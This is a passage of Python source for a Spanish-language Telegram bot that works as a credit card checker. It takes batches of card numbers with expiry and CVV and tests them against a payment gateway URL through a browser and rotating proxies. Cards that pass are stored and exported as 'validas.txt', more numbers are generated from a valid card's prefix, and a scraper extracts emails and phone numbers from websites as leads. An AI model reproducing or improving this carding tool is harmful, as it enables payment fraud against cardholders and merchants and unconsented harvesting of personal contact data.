            f"🌐 <b><code>SERVIDOR:</code></b> <code>{html.escape(proxy_info['host'])}:{html.escape(proxy_info['port'])}</code>\n"
            f"👤 <b><code>USUARIO:</code></b> <code>{html.escape(proxy_info['user'] or 'N/A')}</code>\n"
            f"🔒 <b><code>AUTENTICACIÓN:</code></b> <b><code>{tiene_auth}</code></b>\n"
            f"🛡️ <b><code>TIPO:</code></b> <b><code>{proxy_info['scheme'].upper()}</code></b>\n\n"
            f"⚡ <b><code>Se aplicará automáticamente en todos tus próximos chequeos y scrapeos.</code></b>",
            parse_mode="HTML"
        )
        await enviar_panel_inicio(chat_id, user_id, context)
        return

    # NUEVO PASO: Cuando el usuario presionó 'Scrapper' o /scrape y envía la URL a scrapear
    if paso == 'AWAITING_SCRAPE_URL':
        user_conversations.pop(user_id, None)
        await procesar_scrape_url(chat_id, user_id, texto, context)
        return

    # NUEVO PASO: Cuando el usuario presionó el botón 'Nueva URL'
    if paso == 'AWAITING_NEW_URL':
        url = texto
        if not (url.startswith("http://") or url.startswith("https://")):
            url = "https://" + url

        user_manager.set_url(user_id, url)
        user_conversations.pop(user_id, None)

        await update.message.reply_text(
            f"✅ <b><code>╔════════════════════════════════════════╗</code></b>\n"
            f"✅ <b><code>║     NUEVA URL GUARDADA CON ÉXITO      ║</code></b>\n"
            f"✅ <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
            f"🔗 <b><code>URL CONFIGURADA:</code></b>\n"
            f"<code>{html.escape(url)}</code>\n\n"
            f"⚡ <b><code>Ya está guardada para tus próximos chequeos con /chk.</code></b>",
            parse_mode="HTML"
        )
        return

    # PASO 1: Esperando las tarjetas (sin límite estricto de 10)
    if paso == 'AWAITING_CARDS':
        tarjetas = parsear_tarjetas_texto(texto)
        if not tarjetas:
            await update.message.reply_text(
                f"❌ <b><code>╔════════════════════════════════════════╗</code></b>\n"
                f"❌ <b><code>║        FORMATO NO VÁLIDO              ║</code></b>\n"
                f"❌ <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
                f"⚠️ <b><code>No se detectó ninguna tarjeta correcta.</code></b>\n\n"
                f"📝 <b><code>Envía las tarjetas con el formato:</code></b>\n"
                f"<code>4150070033612022|03|29|458</code>",
                parse_mode="HTML"
            )
            return

        conv['pending_cards'] = tarjetas

        # Comprobar si ya tiene URL guardada
        saved_url = user_manager.get_url(user_id)
        if saved_url:
            user_conversations.pop(user_id, None)
            await update.message.reply_text(
                f"✅ <b><code>╔════════════════════════════════════════╗</code></b>\n"
                f"✅ <b><code>║    TARJETAS CARGADAS: {len(tarjetas):<15} ║</code></b>\n"
                f"✅ <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
                f"🔍 <b><code>USANDO TU URL GUARDADA:</code></b>\n"
                f"<code>{html.escape(saved_url)}</code>\n\n"
                f"⏳ <b><code>Iniciando chequeo...</code></b>",
                parse_mode="HTML"
            )
            await iniciar_chequeo_usuario(update, context, user_id, chat_id, saved_url, tarjetas)
        else:
            conv['step'] = 'AWAITING_URL'
            await update.message.reply_text(
                f"✅ <b><code>╔════════════════════════════════════════╗</code></b>\n"
                f"✅ <b><code>║    TARJETAS RECIBIDAS: {len(tarjetas):<14} ║</code></b>\n"
                f"✅ <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
                f"🌐 <b><code>Por favor, introduce la URL de pago para el chequeo:</code></b>",
                parse_mode="HTML"
            )
        return

    # PASO 2: Esperando la URL
    if paso == 'AWAITING_URL':
        url = texto
        if not (url.startswith("http://") or url.startswith("https://")):
            url = "https://" + url

        conv['pending_url'] = url
        conv['step'] = 'AWAITING_SAVE_CHOICE'

        keyboard = [
            [
                InlineKeyboardButton("💾 Sí, guardar enlace", callback_data="save_url_yes"),
                InlineKeyboardButton("❌ No guardar", callback_data="save_url_no")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)

        await update.message.reply_text(
            f"🔗 <b><code>╔════════════════════════════════════════╗</code></b>\n"
            f"🔗 <b><code>║             URL RECIBIDA              ║</code></b>\n"
            f"🔗 <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
            f"<code>{html.escape(url)}</code>\n\n"
            f"💾 <b><code>¿Deseas guardar este enlace para tus próximos /chk?</code></b>",
            reply_markup=reply_markup,
            parse_mode="HTML"
        )
        return

async def manejar_callback_guardar(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Maneja la respuesta al botón de guardar URL (Sí / No)."""
    query = update.callback_query
    await query.answer()

    user_id = query.from_user.id
    chat_id = query.message.chat_id
    data = query.data

    conv = user_conversations.pop(user_id, None)
    if not conv or 'pending_url' not in conv:
        await query.edit_message_text(
            "⚠️ <b><code>[SESIÓN EXPIRADA] Por favor, vuelve a usar /chk.</code></b>",
            parse_mode="HTML"
        )
        return

    url = conv['pending_url']
    tarjetas = conv.get('pending_cards', [])

    if data == "save_url_yes":
        user_manager.set_url(user_id, url)
        await query.edit_message_text(
            f"💾 <b><code>╔════════════════════════════════════════╗</code></b>\n"
            f"💾 <b><code>║         URL GUARDADA CON ÉXITO        ║</code></b>\n"
            f"💾 <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
            f"<code>{html.escape(url)}</code>\n\n"
            f"🚀 <b><code>Iniciando chequeo...</code></b>",
            parse_mode="HTML"
        )
    else:
        await query.edit_message_text(
            f"👌 <b><code>╔════════════════════════════════════════╗</code></b>\n"
            f"👌 <b><code>║     URL TEMPORAL (SOLO ESTA PRUEBA)   ║</code></b>\n"
            f"👌 <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
            f"<code>{html.escape(url)}</code>\n\n"
            f"🚀 <b><code>Iniciando chequeo...</code></b>",
            parse_mode="HTML"
        )

    await iniciar_chequeo_usuario(update, context, user_id, chat_id, url, tarjetas)

async def manejar_callback_acciones_valida(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Maneja las acciones de una tarjeta válida: 'Nueva URL' y 'Generar 30'."""
    query = update.callback_query
    await query.answer()

    user_id = query.from_user.id
    chat_id = query.message.chat_id
    data = query.data

    if data == "btn_nueva_url":
        user_conversations[user_id] = {'step': 'AWAITING_NEW_URL'}
        await context.bot.send_message(
            chat_id=chat_id,
            text=(
                f"🌐 <b><code>╔════════════════════════════════════════╗</code></b>\n"
                f"🌐 <b><code>║        CONFIGURAR NUEVA URL           ║</code></b>\n"
                f"🌐 <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
                f"📝 <b><code>Por favor, envía la nueva URL de la pasarela:</code></b>\n"
                f"<code>https://...</code>\n\n"
                f"⚡ <b><code>Se guardará de inmediato en tu perfil.</code></b>"
            ),
            parse_mode="HTML"
        )
    elif data.startswith("btn_gen_"):
        prefix = data.replace("btn_gen_", "")[:10]

        info_valida = user_valid_cards.get(user_id, {})
        p4 = info_valida.get('p4', "0329")
        p3 = info_valida.get('p3', "458")

        cards_30 = generar_30_tarjetas(prefix, p4, p3)
        texto_cards = "\n".join(cards_30)

        keyboard = [
            [
                InlineKeyboardButton("⚡ Generar otras 30", callback_data=f"btn_gen_{prefix}"),
                InlineKeyboardButton("🌐 Nueva URL", callback_data="btn_nueva_url")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)

        msg_gen = (
            f"🎲 <b><code>╔════════════════════════════════════════╗</code></b>\n"
            f"🎲 <b><code>║        GENERADOR: 30 TARJETAS         ║</code></b>\n"
            f"🎲 <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
            f"📌 <b><code>PREFIJO BASE (10 DÍGITOS):</code></b> <b><code>{html.escape(prefix)}</code></b>\n"
            f"📊 <b><code>TOTAL GENERADAS:</code></b> <b><code>30 unidades</code></b>\n\n"
            f"<pre><code>{texto_cards}</code></pre>\n\n"
            f"💡 <b><code>Toca el bloque de código para copiarlo al portapapeles.</code></b>"
        )

        await context.bot.send_message(
            chat_id=chat_id,
            text=msg_gen,
            parse_mode="HTML",
            reply_markup=reply_markup
        )
    elif data == "btn_config_proxy":
        user_conversations[user_id] = {'step': 'AWAITING_PROXY'}
        proxy_actual = user_manager.get_proxy(user_id)

        info_actual = ""
        if proxy_actual:
            info_actual = (
                f"\n📌 <b><code>PROXY ACTUAL CONFIGURADO:</code></b>\n"
                f"<code>{html.escape(proxy_actual.get('host'))}:{html.escape(proxy_actual.get('port'))}</code>\n\n"
            )

        keyboard = [
            [
                InlineKeyboardButton("🗑️ Eliminar Proxy Actual", callback_data="btn_delete_proxy")
            ]
        ] if proxy_actual else []
        reply_markup = InlineKeyboardMarkup(keyboard) if keyboard else None

        await context.bot.send_message(
            chat_id=chat_id,
            text=(
                f"🛡️ <b><code>╔════════════════════════════════════════╗</code></b>\n"
                f"🛡️ <b><code>║       CONFIGURACIÓN DE PROXIES        ║</code></b>\n"
                f"🛡️ <b><code>╚════════════════════════════════════════╝</code></b>\n"
                f"{info_actual}"
                f"📝 <b><code>Por favor, envía tu proxy de DataImpulse o HTTP.</code></b>\n\n"
                f"💡 <b><code>Formatos admitidos (puedes pegar tal cual):</code></b>\n"
                f"▫️ <code>curl -x http://usuario:password@gw.dataimpulse.com:823</code>\n"
                f"▫️ <code>http://usuario:password@gw.dataimpulse.com:823</code>\n"
                f"▫️ <code>gw.dataimpulse.com:823:usuario:password</code>\n\n"
                f"⚡ <b><code>El sistema extraerá automáticamente host, puerto y credenciales.</code></b>"
            ),
            parse_mode="HTML",
            reply_markup=reply_markup
        )
    elif data == "btn_delete_proxy":
        user_manager.delete_proxy(user_id)
        user_conversations.pop(user_id, None)
        await context.bot.send_message(
            chat_id=chat_id,
            text=(
                f"🗑️ <b><code>╔════════════════════════════════════════╗</code></b>\n"
                f"🗑️ <b><code>║       PROXY ELIMINADO CON ÉXITO       ║</code></b>\n"
                f"🗑️ <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
                f"⚡ <b><code>A partir de ahora tus chequeos y conexiones se realizarán de forma directa.</code></b>"
            ),
            parse_mode="HTML"
        )
        await enviar_panel_inicio(chat_id, user_id, context)
    elif data == "btn_scrapper_leads":
        user_conversations[user_id] = {'step': 'AWAITING_SCRAPE_URL'}
        await context.bot.send_message(
            chat_id=chat_id,
            text=(
                f"🔍 <b><code>╔════════════════════════════════════════╗</code></b>\n"
                f"🔍 <b><code>║        SCRAPPER // EXTRACCIÓN LEADS   ║</code></b>\n"
                f"🔍 <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
                f"📝 <b><code>Por favor, introduce la URL que deseas scrapear:</code></b>\n"
                f"<code>https://ejemplo.com/contacto</code>\n\n"
                f"⚡ <b><code>El sistema extraerá correos electrónicos, números de teléfono y enlaces de contacto/redes.</code></b>"
            ),
            parse_mode="HTML"
        )

async def cmd_valid(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Comando /valid:
    - Envía todas las tarjetas válidas registradas en un archivo de texto .txt.
    """
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id

    lineas_validas = []

    # 1. Obtener tarjetas del perfil del usuario
    tarjetas_user = user_manager.get_valid_cards(user_id)
    for item in tarjetas_user:
        card = item.get("card", "").strip()
        if card and card not in lineas_validas:
            lineas_validas.append(card)

    # 2. Leer desde validas.txt para asegurar que se recopilen todas las válidas
    if os.path.exists(VALIDAS_FILE):
        try:
            with open(VALIDAS_FILE, "r", encoding="utf-8") as f:
                for line in f:
                    c = line.strip()
                    if c and not c.startswith("#") and c not in lineas_validas:
                        lineas_validas.append(c)
        except Exception as e:
            print(f"[!] Error leyendo validas.txt: {e}")

    if not lineas_validas:
        await update.message.reply_text(
            f"⚠️ <b><code>╔════════════════════════════════════════╗</code></b>\n"
            f"⚠️ <b><code>║       SIN TARJETAS VÁLIDAS            ║</code></b>\n"
            f"⚠️ <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
            f"ℹ️ <b><code>Aún no se ha detectado ninguna tarjeta válida.</code></b>\n\n"
            f"💡 <b><code>Ejecuta /chk para comenzar el chequeo de tarjetas.</code></b>",
            parse_mode="HTML"
        )
        return

    # Preparar el archivo txt en memoria
    contenido_txt = "\n".join(lineas_validas) + "\n"
    archivo_bio = io.BytesIO(contenido_txt.encode("utf-8"))
    archivo_bio.name = "validas.txt"

    caption = (
        f"✅ <b><code>╔════════════════════════════════════════╗</code></b>\n"
        f"✅ <b><code>║     REPORTE DE TARJETAS VÁLIDAS       ║</code></b>\n"
        f"✅ <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
        f"📊 <b><code>TOTAL VÁLIDAS:</code></b> <b><code>{len(lineas_validas)} encontradas</code></b>\n"
        f"📁 <b><code>ARCHIVO:</code></b> <code>validas.txt</code>\n\n"
        f"⚡ <b><code>Descarga el archivo adjunto para ver todas tus válidas.</code></b>"
    )

    await context.bot.send_document(
        chat_id=chat_id,
        document=archivo_bio,
        filename="validas.txt",
        caption=caption,
        parse_mode="HTML"
    )

async def cmd_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Detiene el chequeo en curso del usuario."""
    user_id = update.effective_user.id
    job = active_jobs.get(user_id)

    if job:
        job['stop_event'].set()
        driver = job.get('driver')
        if driver:
            try:
                cerrar_driver_seguro(driver, 1)
            except Exception:
                pass
        await update.message.reply_text(
            f"⏹️ <b><code>╔════════════════════════════════════════╗</code></b>\n"
            f"⏹️ <b><code>║       ORDEN DE PARADA RECIBIDA        ║</code></b>\n"
            f"⏹️ <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
            f"🛑 <b><code>Deteniendo chequeo y cerrando navegador...</code></b>",
            parse_mode="HTML"
        )
    else:
        await update.message.reply_text(
            f"ℹ️ <b><code>[INFO] No tienes ningún chequeo activo en este momento.</code></b>",
            parse_mode="HTML"
        )

# =====================================================================
# INICIALIZACIÓN DE LA APLICACIÓN
# =====================================================================

def main():
    print("=" * 60)
    print("   INICIANDO BOT DE TELEGRAM - AUTOFILL CHECKER (EDGE)   ")
    print(f"   Token: {BOT_TOKEN[:10]}...{BOT_TOKEN[-5:]}")
    print("=" * 60)

    app = ApplicationBuilder().token(BOT_TOKEN).build()

    # Handlers de comandos
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("help", cmd_start))
    app.add_handler(CommandHandler("chk", cmd_chk))
    app.add_handler(CommandHandler("gen", cmd_gen))
    app.add_handler(CommandHandler("valid", cmd_valid))
    app.add_handler(CommandHandler("proxy", cmd_proxy))
    app.add_handler(CommandHandler("scrape", cmd_scrape))
    app.add_handler(CommandHandler("scraper", cmd_scrape))
    app.add_handler(CommandHandler("url", cmd_url))
    app.add_handler(CommandHandler("stop", cmd_stop))

    # Handlers para flujo interactivo de URL y botones
    app.add_handler(CallbackQueryHandler(manejar_callback_guardar, pattern=r"^save_url_"))
    app.add_handler(CallbackQueryHandler(manejar_callback_acciones_valida, pattern=r"^(btn_nueva_url|btn_gen_|btn_config_proxy|btn_delete_proxy|btn_scrapper_leads)"))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, manejar_mensaje_texto))

    print("[✓] Bot conectado a Telegram y escuchando mensajes...")
    app.run_polling()

if __name__ == "__main__":
    main()
